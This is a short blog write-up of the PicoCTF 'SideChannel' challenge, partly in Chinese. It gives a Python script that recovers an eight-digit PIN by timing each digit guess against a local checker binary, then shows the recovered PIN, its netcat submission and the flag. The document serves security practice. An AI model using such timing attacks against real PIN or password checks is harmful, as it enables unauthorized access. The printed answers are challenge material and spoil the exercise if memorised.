---
title: PicoCTF - SideChannel
tags: [PicoCTF, CTF, Misc]

category: "Security Practice｜PicoCTF｜Misc｜General"
date: 2024-01-31
---

# PicoCTF - SideChannel
<!-- more -->

## Description
> There's something fishy about this PIN-code checker, can you figure out the PIN and get the flag? Download the PIN checker program here pin_checker Once you've figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.
> 
> Hint 1: Read about "timing-based side-channel attacks."
> Hint 2: Attempting to reverse-engineer or exploit the binary won't help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
> Hint 3: Don't run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.

## Recon
這一題也是直接看[^this-problem-wp]才知道怎麼解，應該說原本大概也猜到是這樣解，但過程一直不順利，所以沒寫出來，最主要是一開始沒看hint所以reverse/binary exploitation花了太多時間，結果一無所獲，但大致上思路沒差多少，也就是輸入的pin digit如我是對的就會比一般錯誤的pin digit還要多花點時間處理，所以我們就可以鎖定每一個digit原本到底是甚麼

## Exploit
```python
from time import *
from subprocess import *
from tqdm import trange

time_lapse = []
guess_pin = list("99999999")
for i in trange(8):
    for j in range(10):
        guess_pin[i] = str(j)
        payload = "".join(guess_pin)
        start = time_ns()
        p = Popen("./pin_checker", stdin=PIPE, stdout=PIPE, universal_newlines=True, shell=True)
        p.communicate(input=payload)
        time_lapse.append(time_ns() - start)
    guess_pin[i] = str(time_lapse.index(max(time_lapse)))
    time_lapse = []

print("".join(guess_pin))
```
另外這隻程式不是百分百保證成功，還是要多跑幾次確定一下是不是每次都一樣再進行確認

```bash
$ echo 48390513 | ./pin_checker
Please enter your 8-digit PIN code:
8
Checking PIN...
Access granted. You may use your PIN to log into the master server.
$ echo 48390513 | nc saturn.picoctf.net 50364
Verifying that you are a human...
Please enter the master PIN code:
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_9803bd25}
```

Flag: `picoCTF{t1m1ng_4tt4ck_9803bd25}`

## Reference
[^this-problem-wp]:[ picoGym (picoCTF) Exercise: SideChannel ](https://youtu.be/6-GmrNobEyA?si=0HVfVpNwLT_yNm3G)